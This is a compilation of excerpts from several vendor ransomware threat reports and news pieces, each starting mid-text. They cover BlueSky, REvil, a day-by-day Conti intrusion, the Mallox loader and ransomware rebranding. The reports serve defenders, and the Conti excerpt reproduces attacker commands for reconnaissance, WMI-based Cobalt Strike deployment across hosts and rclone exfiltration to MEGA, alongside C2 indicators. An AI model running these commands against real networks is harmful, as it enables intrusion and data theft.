The initial dropper is Base64-encoded\nand then DEFLATE-compressed, which is common behavior observed among PowerShell\ndroppers.\n\nhttps://chuongdong.com/reverse%20engineering/2021/01/16/BabukRansomware-v3/\nhttps://en.wikipedia.org/wiki/ChaCha20-Poly1305\nhttps://en.wikipedia.org/wiki/Curve25519\nhttps://cloudsek.com/threatintelligence/tracking-the-operators-of-the-newly-emerged-bluesky-ransomware/\nhttps://www.paloaltonetworks.com/cortex/cortex-xdr\nhttps://www.paloaltonetworks.com/network-security/next-generation-firewall\nhttps://www.paloaltonetworks.com/network-security/security-subscriptions\nhttps://www.paloaltonetworks.com/network-security/next-generation-firewall\nhttps://www.paloaltonetworks.com/network-security/advanced-url-filtering\nhttps://www.paloaltonetworks.com/unit42/respond/incident-response\nhttps://www.paloaltonetworks.com/unit42/assess\nhttps://unit42.paloaltonetworks.com/category/ransomware/\nhttps://unit42.paloaltonetworks.com/tag/conti-ransomware/\n\n\n3/13\n\nFigure 1. Initial dropper.\nAfter extracting the embedded Base64-encoded stream from start.ps1, the decoded and\nuncompressed data stream led to yet another PowerShell script called stage.ps1. This script\ncontained countless irrelevant comments in an attempt to conceal malicious activity. After removing\nthese excessive comments, we discovered that start.ps1 downloaded a number of payloads from\nhxxps://kmsauto[.]us/someone/ based on the user’s privileges, as shown in Figure 2.\n\n\n\n4/13\n\nFigure 2. Initial dropper (decoded).\n\nLocal Privilege Escalation\n\nBefore downloading additional payloads to perform local privilege escalation, the PowerShell script,\nstage.ps1, determines if it is being executed as a privileged user. If so, it moves to the next step\nand downloads and executes the ransomware payload. If not, it uses the following techniques to\nescalate local privileges, depending on the version of the host operating system. If the version of\nthe host operating system is earlier than Windows 10, such as Windows 7, 8 or XP, then the script\nwill download and execute a modified version of the local privilege escalation tool called\nJuicyPotato. If the host is running Windows 10 or later, then the script will download and execute\nghost.exe and spooler.exe to exploit local privilege escalation vulnerabilities CVE-2020-0796 and\nCVE-2021-1732 respectively.\n\nRansomware Payload\n\nAfter gaining additional privileges, stage.ps1 downloads the final BlueSky ransomware payload\nfrom hxxps://kmsauto[.]us/someone/l.exe and saves it locally to the filesystem as javaw.exe,\nattempting to masquerade as a legitimate Windows application. Eventually, the sample executes\nfrom the file path %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\javaw.exe.\n\nhttps://github.com/ohpe/juicy-potato\nhttps://nvd.nist.gov/vuln/detail/cve-2020-0796\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-1732\n\n\n5/13\n\nRansom Note\n\nBlueSky drops the ransom note as a text file named # DECRYPT FILES BLUESKY #.txt and an\nHTML file named # DECRYPT FILES BLUESKY #.html in a local directory where it has encrypted\nfiles successfully and renamed them with the file extension .bluesky. The content of # DECRYPT\nFILES BLUESKY #.html is shown in Figure 3.\n\nFigure 3. BlueSky ransom note.\n\nAnti-Analysis Techniques\n\nBlueSky implements multiple anti-analysis techniques, including string encryption, API obfuscation\nand anti-debugging mechanisms, allowing it to obfuscate Windows API function names and use\nindirect calls for resolving APIs. Additionally, BlueSky encodes API names using DJB hashing\nfunctions as shown in Figure 4, hindering malware analysis.\n\n\n\n6/13\n\nFigure 4. DJB hash matching.\n\nRansomware Artifacts\n\nBlueSky generates a unique user ID by computing the MD5 hash over the combined Volume\nInformation, Machine GUID, Product ID and Install Date values, as shown in Figure 5. Furthermore,\nit uses the same ID for generating the mutex Global\\<32-byte ID>.\n\n\n\n7/13\n\nFigure 5. Unique ID calculation.\nIt creates the registry key HKCU\\Software\\<32-byte ID> to store registry entries completed,\nRECOVERY BLOB and x25519_public to fingerprint its ransomware operations. Once the\nencryption process is completed, the registry entry completed is set with a value of 1. RECOVERY\nBLOB is a fingerprint identifier for the compromised organization, which is encrypted by the\nChaCha20 encryption algorithm. The structure of the RECOVERY BLOB is shown in Table 1.\n\nOffset Data Size\n\n0x00 Curve25519 public key 0x20\n\n0x20 Cryptographic random value 0x0C\n\n0x2C Curve25519 secret key 0x20\n\n0x4C Unique user ID 0x10\n\n0x5C Hardcoded RC4-decoded bytes 0x10\n\n0x6C Unknown DWORD 0x04\n\n\n\n8/13\n\nOffset Data Size\n\n0x70 Unknown DWORD 0x04\n\n0x74 Constant value 0x1000 0x04\n\nTable 1. Recovery blob structure.\n\nThe RECOVERY BLOB is then encrypted with ChaCha20 as shown in Figure 6 and stored in\nHKCU\\Software\\<32-byte ID>\\RECOVERY.\n\nFigure 6. Recovery blob encryption.\n\nFile Encryption\n\nUnlike other ransomware, which normally contains a list of file extensions to identify eligible files for\nencryption, BlueSky consists of a list of extensions that are negated in the file encryption process.\nThe file extensions used in BlueSky are listed below:\n\n\nldf, scr, icl, 386, cmd, ani, adv, theme, msi, rtp, diagcfg, msstyles, bin, hlp, shs, drv, wpx, bat, rom,\nmsc, lnk, cab, spl, ps1, msu, ics, key, msp, com, sys, diagpkg, nls, diagcab, ico, lock, ocx, mpa, cur,\ncpl, mod, hta, exe, ini, icns, prf, dll, bluesky, nomedia, idx\n\nDirectory names excluded from encryption:\n\n$recycle.bin, $windows.~bt, $windows.~ws, boot, windows, windows.old, system volume\n\ninformation, perflogs, programdata, program files, program files (x86), all users, appdata, tor\nbrowser\n\nFilenames excluded from encryption:\n\n# decrypt files bluesky #.txt, # decrypt files bluesky #.html, ntuser.dat, iconcache.db, ntuser.dat.log,\n\nbootsect.bak, autorun.inf, bootmgr, ntldr, thumbs.db\n\nAs shown in Figure 7, BlueSky uses a multithreaded queue for encryption. It starts multiple threads\n– one responsible for file encryption, another for enumerating files on the local file system and\nmounted network shares to be added into the queue. This multithreaded architecture bears code\nsimilarities with Conti (Ransomware) v3. In particular, the network search module is an exact replica\n\n\n\n9/13\n\nof Conti v3. However, there are certain differences in the file encryption routine. For instance, Conti\nv3 uses RSA- and AES-based file encryption, whereas BlueSky utilizes Curve25519- and\nChaCha20-based file encryption.\n\nFigure 7. Ransomware queues.\nThe file encryption of BlueSky is similar to Babuk Ransomware – both use Curve25519 to generate\na public key for the host and generate a shared key with the public key of the attacker. After\ngenerating an elliptic curve key pair, BlueSky computes a hash of the shared key, and uses it to\ngenerate a file encryption key for the ChaCha20 algorithm. Finally, it reads the file buffer, encrypts it\nwith ChaCha20 and replaces the contents of the original file, as shown in Figure 8.\n\nFigure 8. File encryption routine.\n\nRedLine Infostealer Association\n\nhttps://chuongdong.com/reverse%20engineering/2021/01/16/BabukRansomware-v3/\n\n\n10/13\n\nAll samples we observed related to BlueSky ransomware were hosted at an active domain named\nkmsauto[.]us. When hunting for more samples related to BlueSky ransomware, we observed that\nseveral malware samples associated with the RedLine infostealer were hosted on the same\ndomain. Although we did not find any code overlap between RedLine and BlueSky ransomware,\nsimilarities in the initial stages were observed, as both these families use a PowerShell downloader\nas the initial vector.\n\nConclusion\n\nRansomware authors are adopting modern advanced techniques such as encoding and encrypting\nmalicious samples, or using multi-staged ransomware delivery and loading, to evade security\ndefenses. BlueSky ransomware is capable of encrypting files on victim hosts at rapid speeds with\nmultithreaded computation. In addition, the ransomware adopts obfuscation techniques, such as\nAPI hashing, to slow down the reverse engineering process for the analyst.\n\nIt is very likely that ransomware attacks will continue to grow with advanced encryption techniques\nand delivery mechanisms.\n\nPalo Alto Networks customers with Cortex XDR, the Next-Generation Firewall and Advanced URL\nFiltering benefit from protections against the attacks discussed in this article.

On 14th January 2022, Russia announced\nit had arrested 14 members of the criminal gang. The move came at the request of the US\nauthorities, who have worked hard with international partners to crack down on the gang.\nLast year, multiple high-profile attacks were attributed to the REvil group, including the JBS\nransomware and Kaseya supply chain incidents.\n\nThe arrests are certainly a victory for western law enforcement agencies, and follows\nNovember’s announcement from Europol that seven arrests of REvil affiliates had been\nmade in the preceding months. The question is: to what extent will these arrests disrupt the\ngang’s operations, and for how long?\n\nEarly indications from security researchers at ReversingLabs indicates REvil activity has\nbeen unaffected. Statistics on REvil implants two weeks after the Russian arrests are\nunchanged, and if anything indicate a modest increase.\n\nThis continued activity implies one of two scenarios:\n\nhttps://www.darktrace.com/en/blog/staying-ahead-of-r-evils-ransomware-as-a-service-business-model/\nhttp://10.10.0.46/blog/minimizing-the-r-evil-impact-delivered-via-kaseya-servers\nhttp://securityweek.com/russia-lays-smackdown-revil-ransomware-gang\nhttp://10.10.0.46/blog/minimizing-the-r-evil-impact-delivered-via-kaseya-servers\nhttps://blog.reversinglabs.com/blog/after-russian-arrests-revil-rolls-on\n\n\n2/5\n\nThe flurry of arrests have only impacted ‘middle men’ within the criminal gang’s\nhierarchy\nREvil’s ransomware-as-a-service model is resilient enough to survive disruption from\nlaw enforcement\n\nBoth scenarios are worrisome to those who may fall prey to ransomware gangs, and the\nreality is likely to be a far more complex mixture of these and other factors. The crackdown\non ransomware is long overdue, but the battle is likely to be a long one. Law enforcement\nagencies need to disrupt the business model to such an extent that it no longer becomes\nprofitable or favorable to be in the ransomware business, and this is likely to take months or\neven years.\n\nSo as the crackdown on ransomware plays out on the biggest stage, what comfort, if any,\ncan security teams take from recent events?\n\nStaying ahead of the evolving RaaS model with AI\n\nA joint report on ransomware issued recently by the FBI, CISA, the NCSC, the ACSC and\nthe NSA highlighted key trends over the past year:\n\nRaaS has become increasingly professionalized, with business models and processes\nnow well established.\nThe business model complicates attribution because there are complex networks of\ndevelopers, affiliates, and freelancers.\nRansomware groups are sharing victim information with each other, diversifying the\nthreat to targeted organizations.\n\nIn summary, the report illuminates how ransomware gangs have become increasingly\nadaptable when it comes to evading law enforcement and maximizing profit from ransom\npayments. Multiple groups have faded away, or retired, only to reappear under a different\nname and with a slightly updated playbook. The tactics, techniques, and procedures (TTPs)\ndiffer from victim to victim, largely because attacks are conducted by different ransomware\noperators and affiliates.\n\nThis is troubling for law enforcement bodies trying to crack down on the individuals behind\nthese attacks. When a RaaS group like REvil consists of an amorphous and ever-changing\nweb of associates, making individual arrests is a constant game of catch up, and will be\nunlikely to bring down the group as a whole.\n\nThe same battle is being played out on the scale of individual attack campaigns. Security\ntools focused on the hallmarks of previously encountered threats are also in a continuous\nstate of catch up: by the time a single attack is detected, fingerprinted, and stored for next\ntime, attackers and their techniques have moved on.\n\nhttps://www.ncsc.gov.uk/files/2021%20Trends%20show%20increased%20globalised%20threat%20of%20ransomware.pdf\n\n\n3/5\n\nBut there is another option available to defenders, who are increasingly turning to Self-\nLearning AI to stay one step ahead of attackers. By learning its digital surroundings and\nidentifying subtle deviations indicative of an attack, this technology can detect and respond\nto novel attacks on the first encounter. Below is an example of how Self-Learning AI detected\nan attack launched by REvil without the use of rules or signatures.\n\nREvil threat find\n\nIn the summer of 2021, a REvil affiliate launched an attack against a health and social care\norganization – a sector that has seen a big increase in cyber-attacks since the start of the\nglobal pandemic. While the attack was detected by Darktrace’s AI without using rules or\nsignatures, the security team was not monitoring Darktrace at the time. In the absence of\nAutonomous Response – which would have taken targeted action to contain the threat – the\nattack was allowed to progress.\n\nAfter gaining access to the network via the laptop of a remote worker, the attacker was able\nto abuse a legitimate remote desktop (RDP) connection to a corporate jump server to\nbruteforce additional credentials.\n\nOnce equipped with more credentials, the attacker connected to multiple internal devices via\nRDP, including a second jump server. Data exfiltration began from the initially compromised\nserver over RDP port 3389.\n\nTwo weeks later, the attacker identified the organization’s crown jewels, stored on a third\nserver, and attempted to initiate command and control (C2) communications. The server\nmade a number of unusual external connections, including attempts to connect to a rare\ndomain that resembled the pattern of activity associated with REvil’s earlier Kaseya\nransomware campaign.\n\nDarktrace for Endpoint, which was running on remote user devices, provided additional\nvisibility, enabling the security team to determine the initially compromised user device. Had\nAntigena been active on the endpoint, it would have intervened to stop this unusual activity\nby blocking the specific unusual connections – containing the attack without impacting\nnormal business operations.\n\nConnecting the dots of a low-and-slow attack\n\nThe total dwell time of the attacker was 22 days. They were patient, and undertook actions in\nbursts of activity often with days in between. This pattern of behavior is not uncommon for\nransomware attacks, particularly those using the RaaS model in which each step may be\nperformed by different gang members or affiliates.\n\nDarktrace’s Cyber AI Analyst was able to track in real time the complete attack lifecycle over\nseveral weeks, stitching together the separate phases of the attack into a coherent security\nincident.\n\nhttps://www.forbes.com/sites/forbestechcouncil/2021/06/07/increased-cyberattacks-on-healthcare-institutions-shows-the-need-for-greater-cybersecurity/\nhttp://10.10.0.46/autonomous-response\nhttp://10.10.0.46/blog/minimizing-the-r-evil-impact-delivered-via-kaseya-servers\nhttp://10.10.0.46/endpoint\n\n\n4/5\n\nFigure 1: Cyber AI Analyst reveals the complete attack kill chain\n\nNew name, same game\n\nThis attack is another case of threat actors living off the land: using legitimate programs and\nprocesses that were already in use in the environment to perform malicious activity. This can\nbe very difficult to detect with traditional tools that are based on static use cases and cannot\ndifferentiate a legitimate RDP session from a malicious one.\n\nAs cyber-criminal groups like REvil continue to defy law enforcement efforts, defenders need\nto stay ahead with AI technology that learns its environment, adapts as it changes and\ngrows, and responds to threats based on subtle deviations that indicate an emerging attack.\nAutonomous Response has been adopted by over thousands of organizations across all\nareas of the digital estate – from email and cloud services to endpoint devices, stopping\nransomware attacks early, before encryption is achieved.\n\nThanks to Darktrace analyst Petal Beharry for her insights on the above threat find.\n\nTechnical details\n\nIoCs:\n\nIoC Description\n\n91.184.0[.]34 Attempting to beacon to Command and Control\n\n93.158.97[.]64 Attempting to beacon to Command and Control\n\n67.227.249[.]156 Attempting to beacon to Command and Control\n\n149.11.42[.]53 Location of exfiltration server\n\nDarktrace model detections:\n\nDevice / RDP Scan\nDevice / Bruteforce Activity\nCompliance / Outbound Remote Desktop\nAnomalous Connection / Upload via Remote Desktop\nAnomalous Connection / Download and Upload\nAnomalous Connection / Uncommon 1 GiB Outbound\nAnomalous Connection / Active Remote Desktop Tunnel\nDevice / New or Uncommon SMB Named Pipe\nDevice / Large Number of Connections to New Endpoints\n\nMITRE ATT&CK techniques observed:\n\nhttp://10.10.0.46/blog/living-off-the-land-how-hackers-blend-into-your-environment\n\n\n5/5\n\nReconnaissance TA0043 active scanning\n\nCredential Access TA0006 bruteforce\n\nLateral Movement TA0008 Exploitation of remote services\n\nExfiltration TA0010 Exfiltration over alternative protocol\n\nCommand and Control TA0011 Application layer protocol\n\nOakley Cox\n\nOakley Cox is Analyst Technical Director for the Asia-Pacific region, and oversees the\ndefense of critical infrastructure and industrial control systems, helping to ensure that\nDarktrace’s AI stays one step ahead of attackers.

Sophos Rapid Response has encountered multiple confirmed Conti ransomware\nattacks in the past six months. Sophos operators also strongly believe they encountered\nwhat would have been another incident of Conti had they not stopped the attack before\nransomware was deployed.\n\nhttps://news.sophos.com/en-us/2021/02/16/conti-ransomware-attack-day-by-day/\nhttps://news.sophos.com/en-us/?p=72459&\nhttps://news.sophos.com/what-to-expect-when-youve-been-hit-with-conti-ransomware\n\n\n2/9\n\nSince its first appearance, Conti was assumed to be the successor to Ryuk with one crucial\ndifference in that the group behind Conti threatens to leak exfiltrated data to strong-arm\nvictims into paying the ransom. This use of exfiltrated data means organizations from almost\nany industry could be targeted, although the Conti group has hit organizations in retail,\nmanufacturing, construction, and the public sector more often.\n\nOne confirmed case involved an attack on an organization who was able to remove the\nattacker from one server only to find the attacker had gained access to two servers at the\nsame time. Despite the company’s efforts, Sophos Rapid Response needed to be called in to\ndeal with a Conti ransomware attack against nearly 300 endpoints.\n\nhttps://news.sophos.com/wp-content/uploads/2021/02/sophos-sector-industry-data-published-by-conti-ransomware-1200x628px-1.png\n\n\n3/9\n\nIt took just over 2.5 hours for the Rapid Response team to determine what accounts and\ndevices were affected, what tools were used in the attack, block the attack from continuing,\nand walk the customer through the process of the Rapid Response engagement.\n\nIn less than 24 hours after Rapid Response was engaged, most of the customer’s critical\ninfrastructure was able to restart normal operation, and within 48 hours, the team confirmed\nthe initial access point of the attack.\n\nA thorough incident response plan is key to dealing with a similar Conti ransomware attack.\nCheck out the Sophos IT admin’s guide to What to expect when you’ve been hit with Conti\nransomware.\n\nLet’s dig into the Conti attack, day-by-day, and in some cases minute-by-minute.\n\nDay 1 – Initial access and scans\n\nThe initial access point for the attack was eventually determined to be a FortiGate firewall\nrunning vulnerable firmware, version 5.6.3 build 1547(GA). Once inside, the attacker gained\naccess to two different servers simultaneously, down to the exact second.\n\nIt took the attacker exactly 16 minutes to exploit the vulnerable firewall and gain domain\nadmin access to the two servers.\n\nOver the next six hours, the attacker deployed a Cobalt Strike beacon on one of the servers\nand began running commands to gather a list of domain admin accounts:\n\ncmd.exe /C nltest /dclist:[target company name]\n cmd.exe /C net group “domain Admins” /domain\n cmd.exe /C nltest /DOMAIN_TRUSTS\n\n cmd.exe /C adft.bat\n cmd.exe /C type shares.txt\n\nAnd commands to map out the basic network topography:\n\nping <computer name>.<domain>.local -n 1\n cmd.exe /C portscan <IP ranges> icmp 1024\n\nOn the second server, the attacker did nothing at first.\n\nThe victim identified and shut down the attack in progress on one server, unfortunately they\ndid not detect the access the attacker had to the other server.\n\nAfter the victim shut down the attacker’s access to the first server, it took just 15 minutes for\nthe attacker to pivot to the second server, deploy another Cobalt Strike beacon and resume\nthe attack. The attacker then used the domain admin account compromised to gain access\n\nhttps://news.sophos.com/what-to-expect-when-youve-been-hit-with-conti-ransomware\n\n\n4/9\n\nto a third server and ran the following Windows Management Instrumentation (WMI)\ncommand to remotely deploy another Cobalt Strike beacon on the third server :\n\ncmd.exe /C wmic /node:<IP Address> process call create “rundll32.exe\nC:\\Programdata\\sys.dll entryPoint\n\nDay 2\n\nOn the second day, Sophos did not detect any malicious activity.\n\n\n\n5/9\n\nDay 3 – Data exfiltration and credential gathering\n\nOver the course of 10 hours on the third day of the attack, the threat actors identified\ndirectories with potentially valuable data and began exfiltration.\n\n\n\n6/9\n\nThe attacker deployed RClone to the third server and created a config file with the login\ncredentials for Mega. The directories exfiltrated included data from the Human Resources\ndepartment, IT department, credit department, accounting, senior staff, and directories\nlabeled as budget.\n\nFirst, the attacker deployed RClone and created a config file containing the email and\npassword for the Mega account where the exfiltrated data would be transferred.\n\nrclone.exe  copy “\\\\<Server 3>\\<Folder path>” remote:<victim name> -q –ignore-existing –\nauto-confirm –multi-thread-streams 12 –transfers 12\nC:\\Users\\<compromised domain admin>\\.config\\rclone\\rclone.conf\n\nThe attacker also executed a batch script, cp.bat, to search for user credentials by copying\nall XLSX files with the string “pas” in the filename.\n\nDay 4 – Conti attacks and beginning of Rapid Response engagement\n\nOn day one of the attack, the threat actors had gathered a map of the victim’s network and\nsaved text file lists of the endpoints and servers. At approximately 1:00 am local time on day\n4, the attacker used batch scripts to loop through those lists of devices in order to copy\nCobalt Strike loaders onto a total of nearly 300 endpoints and servers.\n\nFirst, the attacker deployed a Cobalt Strike beacon to a fourth server as a test:\n\ncmd.exe /C wmic /node: <Server 4 IP Address> process call create “rundll32.exe\nC:\\Programdata\\doc.dll entryPoint”\n\nNext, the attacker executed a batch script, copy_files_srv.bat, to deploy the Cobalt Strike\nloader, doc.dll, on the target servers listed in srv.txt:\n\nfor /f %%i in (srv.txt) do copy “C:\\ProgramData\\doc.dll” \\\\%%i\\c$\\ProgramData\\doc.dll\n\nThen, the attacker executed another batch script, wm_start.bat, to run the Cobalt Strike\nloader on each server listed in srv.txt via rundll32.exe and initiate the beacon:\n\nfor /f %%i in (srv.txt) do wmic /node: %%i process call create “rundll32.exe\nC:\\Programdata\\doc.dll entryPoint”\n\nThese last two commands were then repeated with the batch script, copy_files_work.bat,\nand text file work.txt to deploy and initiate the Cobalt Strike beacons onto nearly 300 target\nendpoints on the victim’s network.\n\nThe Cobalt Strike beacons were kicked into gear 40 minutes after being loaded onto the\ntarget devices and used a technique called reflective DLL injection to launch Conti.\n\n\n\n7/9\n\n“A DLL file dropped onto the target devices connected to a C2 address and gets the\nransomware code hosted there. The ransomware code is then executed directly in memory,\nmeaning when it starts encrypting the target machine it has never been written to disk,” Peter\nMackenzie, manager of Rapid Response said. “Despite how clever this is, Sophos Intercept\nX technology would still have no problem stopping it.”\n\nThe C2 addresses used were:\n\nDocns[.]com/us/ky/louisville/312-s-fourth-st.html\ndocns[.]com/OrderEntryService.asmx/AddOrderLine\n23[.]106[.]160[.]174\n\nOver the course of the next 3 hours, Sophos Intercept X successfully detected and blocked\nConti on all of the protected computers, but damage was done to unprotected devices. For\nmore how the DLL reflection injection and Conti ransomware worked, check out the technical\ndetails on Conti ransomware by Sophos Uncut.\n\nThe customer blocked all internet traffic except Sophos, shut down critical infrastructure, and\ncalled Sophos Rapid Response.\n\nWithin the first 45 minutes Rapid Response was under contract, before even having the\nkickoff call to walk the customer through the service, the Rapid Response team had:\n\nIdentified the compromised account used in the attack\nIdentified and blocked the malicious DLL used to deploy Conti\nIdentified and blocked the command and control (C2) addresses used by the attacker\nIdentified all endpoints targeted\nDeployed Sophos Managed Threat Response (MTR) to the customer environment\nBegun collecting forensic evidence\n\nIn the 45 minutes following the kickoff call, the Rapid Response team also built a list of all the\ndata exfiltrated by the attacker.\n\nDay 5 – Back to normal\n\nBy the fifth day after the attacker first gained access to the victim’s network, and less than 24\nhours from when Sophos Rapid Response was called in, the customer was able to restart\nmost of their critical infrastructure to normal operation.\n\nWith the help of Rapid Response, all unprotected machines were recovered either from\nbackups or by re-imaging, then protected with Sophos and multi-factor authentication was\nenabled on the customer’s VPN.\n\nhttps://news.sophos.com/en-us/?p=72459&\nhttp://www.sophos.com/rapidresponse\n\n\n8/9\n\nThe investigation for Rapid Response was not over yet though. The team identified a\npossible second exfiltration of data, a second compromised account, and suspicious Remote\nDesktop Protocol (RDP) traffic through the vulnerable firewall.\n\nDay 6 and 7 – Finishing up and handing off\n\nWith the attack stopped and recovery complete, all that was left was a bit of cleanup,\nincluding confirming the initial access method for the attacker and having the customer\nupgrade their firewall to close that vulnerable point.\n\nSophos Rapid Response then handed off the customer to the Sophos Managed Threat\nResponse team to continue 24/7 monitoring.\n\nDetection and IoCs\n\nComponents of Conti ransomware can detected in Sophos Endpoint Protection under the\nfollowing definitions: HPmal/Conti-B, Mem/Conti-B, or Mem/Meter-D.\n\nAdditional indicators of compromise have been published to the SophosLabs Github.\n\nConti group Tactics, Techniques, and Procedures (TTPs)\n\nIn this case, the Conti group gained initial entry into victim environments by exploiting public\nfacing applications (MITRE ATT&CK T1190) and using a compromised domain admin\naccount (MITRE ATT&CK T1212) to facilitate lateral movement.\n\nThe threat actor exploited a vulnerability in FortiGate firewall version 5.6.3 build 1547(GA).\nKnown exploits for this vulnerable firmware include one critically rated vulnerability (CVE-\n2018-13379) and one high rated vulnerability (CVE-2018-13374).\n\nThe group used multiple batch scripts for system network configuration discovery (MITRE\nATT&CK T1016), remote system discovery (MITRE ATT&CK T1018), and network service\nscanning (MITRE ATT&CK T1046). Immediately following initial access, the threat actor\nsearched to identify domain admin accounts (MITRE ATT&CK T1078.002) and network\nshares (MITRE ATT&CK T1021.002).\n\nDeployment of Cobalt Strike beacons and loaders were performed using Windows\nManagement Instrumentation commands (MITRE ATT&CK T1047).\n\nThe threat actor used RClone in order to exfiltrate data to file storage service MEGA (MITRE\nATT&CK T1567.002).\n\nCobalt Strike beacons loaded onto all target systems to perform a DLL reflective injection\nattack (MITRE ATT&CK T1055.001), where a DLL called to C2 addresses to get the Conti\ncode, then load it and execute it directly in memory without writing the ransomware to disk\n\nhttps://github.com/sophoslabs/IoCs/blob/master/Ransomware-Conti.csv\nhttps://attack.mitre.org/techniques/T1190/\nhttps://attack.mitre.org/techniques/T1212/\nhttps://nvd.nist.gov/vuln/detail/CVE-2018-13379\nhttps://nvd.nist.gov/vuln/detail/CVE-2018-13374\nhttps://attack.mitre.org/techniques/T1016\nhttps://attack.mitre.org/techniques/T1018/\nhttps://attack.mitre.org/techniques/T1046/\nhttps://attack.mitre.org/techniques/T1078/002\nhttps://attack.mitre.org/techniques/T1021/002\nhttps://attack.mitre.org/techniques/T1047\nhttps://attack.mitre.org/techniques/T1567/002\nhttps://attack.mitre.org/techniques/T1055/001/\n\n\n9/9\n\nbefore encrypting data for impact (MITRE ATT&CK T1486).\n\nIf you are experiencing an active incident and need immediate response,\ncontact Sophos Rapid Response.

Our research indicates that the loader is\nknown to be downloading other malware families such as Agentesla, Remcos, Snake keylogger, etc. This\nloader usually arrives via spam email with different flavors to lure the users into downloading and executing\nthe email attachment.\n\nThe loader acts as a downloader that downloads encrypted malicious content from the remote server,\ndecrypts it in the loader memory, and executes it. The loader executes the malicious content in the memory\nwithout saving the actual payload in the disk to evade anti-virus detection. The loader downloads\nencrypted payloads with a file extension such as png, jpeg, or bmp.\n\nThe loader is 32-bit .Net executable file with the file name “Cqasdqtamip.exe” and sha265 as\ne3a0bbd623db2b865fc3520c8d05e8b92016af2e535f0808460295cb8435836a. Additional details are\nshown in the figure below.\n\nFigure 3 – File Details of Mallox Loader\nUpon execution, the loader downloads the encrypted malicious content from the URL\nhxxp://80[.]66[.]75[.]98/Chseiyk.jpeg.\n\nThe figure below shows the hardcoded URL and code to download the file.\n\n\n\n4/13\n\nFigure 4\n\n– Malicious URL and Code to Download the Encrypted Payload\nAfter downloading, the loader keeps the encrypted content in the memory to decrypt it. The malicious\ncontent is encrypted with the AES encryption algorithm using the key “Cwgoawrnxz”, which is hardcoded in\nthe loader’s binary.\n\nThe figure below shows the encrypted payload in the memory and decryption key.\n\n\n\n5/13\n\nFigure 5 – Loader Code to Decrypt the Malicious Content\nThe loader now decrypts the payload to get the actual ransomware binary in the memory and further\nexecutes this binary to perform ransomware activities. The below Figure shows the Decrypted ransomware\nDLL file in the memory.\n\nFigure 6 – Routine to Decrypt Downloaded Payload\n\nMallox Ransomware Payload Analysis:\n\nThe downloaded and decrypted file is a 32-bit .NET-based DLL with the name “Wwxjdcapjnmuq.dll” and\nsha256 as b64606198c158f79287b215343d286adf959e89acb054f8f3db706f3c06f48aa.\n\nThe following figure shows additional details.\n\n\n\n6/13\n\nFigure 7 – Details of Malicious DLL Payload\nThe DLL file is further obfuscated with an IntelliLock obfuscator to make malware reversal more difficult.\nThe loader now loads the decrypted ransomware DLL as assembly using the Assembly.Load() function.\n\nAfter loading DLL, the loader enumerates methods from the DLL file and creates a list of method names\nand objects from the loaded assembly. The loader now creates a thread pool of the methods for executing\nthe ransomware code. The figure below shows the code to load the DLL as assembly, creating the list of\nmethods and thread pool for executing the ransomware code.\n\n\n\n7/13\n\nFigure 8 –\n\nCode to Dynamically Load the Methods from the Ransomware\nAfter creating the thread pool, the loader then uses the InvokeMember() function to execute the threads for\na list of previously created methods. The following figure shows the code to execute threads for the\nmethods created from the loaded assembly.\n\n\n\n8/13\n\nFigure 9 – Code to Execute the Methods for Ransomware Operation\nAfter execution, the ransomware drops a batch file “Axfiysgodhtrlqmrgpchkiller.bat” into the temp folder and\nexecutes it. This batch file stops numerous services and programs so that associated files are encrypted\nwithout any interruption during the encryption process.\n\nThe following figure shows the contents of the batch file.\n\nFigure 10 – Contents of the Batch File\nInterestingly, the ransomware also stops GPS-related programs, indicating that the ransomware could be\ntargeting organizations dealing in the critical infrastructure sector.\n\nThe figure below shows the commands to stop running GPS-related programs.\n\n\n\n9/13\n\nFigure 11 – Batch File Containing GPS-Related Program\nThe ransomware disables several services and stops running programs in the system. Some important\nservices and programs are:\n\nDatabase Related Services: MSSQL, MSSQL Server, PostgreSQL, Oracle, etc.\nBackup Related Services: VSS, Veeam, etc.\nWindows Related Programs: OneDrive, Excel, Outlook, WinWord, etc.\nFile Sharing and Servers Related programs: FileZilla FTP Server, Apache Tomcat Server,\nMicrosoft Exchange Server, OpenSSH, WAMP Server, Nginx, etc.\nBusiness Management Software: SAP Business One, Jenkins, Redis, SVN Server, Turbo CRM,\nKingdee, etc.\nVirtualization Programs and Services: VirtualBox, VMware. Etc.\nGPS Related Commands: GPSDaemon, GPSUserSvr, GPSDownSvr, GPSStorageSvr,\nGPSDataProcSvr, GPSGatewaySvr, etc.\n\nBefore encrypting the files, the ransomware exfiltrates system information such as Operating system\nversion, Desktop name, etc., and sends it to the Command & Control (C&C) server using a POST request\nas shown below.\n\nFigure 12 – Victim information being exfiltrated to Ransomware’s C&C\nThe ransomware then encrypts the files, appends “.Mallox” as a file extension, and drops a ransom note in\nthe folders, as shown below.\n\n\n\n10/13\n\nFigure 13 – Encrypted Files and Ransom Note\nThe figure below shows the ransom note dropped on the victim system.\n\nFigure 14 – Contents of the Mallox Ransomware Note\nThe ransom note also contains a private chat link for the victims to connect with the Threat Actor. The Chat\npage contains information such as TargetID, hard disk size, Payment Details, etc.\n\nThe TA has also provided features in their Chat page to their victims for uploading encrypted samples to\ntest the decryption.\n\n\n\n11/13\n\nFigure 15 – Victim’s chat page\n\nConclusion\n\nOver the last few days, we have observed increased levels of activity from the Mallox ransomware group.\nThe ransomware group is using an unknown loader which is used for downloading and executing the\nransomware. Additionally, Mallox ransomware stopped GPS-related services, indicating their targets could\nbe organizations dealing in Operation Technology and Critical Infrastructure.\n\nOur Recommendations \n\nWe have listed some of the essential cybersecurity best practices that create the first line of control against\nattackers.

We hang on to these occasional victories because history\ntells us that most ransomware moneymaking collectives don’t go away so much as reinvent\nthemselves under a new name, with new rules, targets and weaponry. Indeed, some of the\nmost destructive and costly ransomware groups are now in their third incarnation.\n\nA rough timeline of major ransomware operations and their reputed links over time.\n\nReinvention is a basic survival skill in the cybercrime business. Among the oldest tricks in the\nbook is to fake one’s demise or retirement and invent a new identity. A key goal of such\nsubterfuge is to throw investigators off the scent or to temporarily direct their attention\nelsewhere.\n\nCybercriminal syndicates also perform similar disappearing acts whenever it suits them.\nThese organizational reboots are an opportunity for ransomware program leaders to set new\nground rules for their members — such as which types of victims aren’t allowed (e.g.,\nhospitals, governments, critical infrastructure), or how much of a ransom payment an affiliate\nshould expect for bringing the group access to a new victim 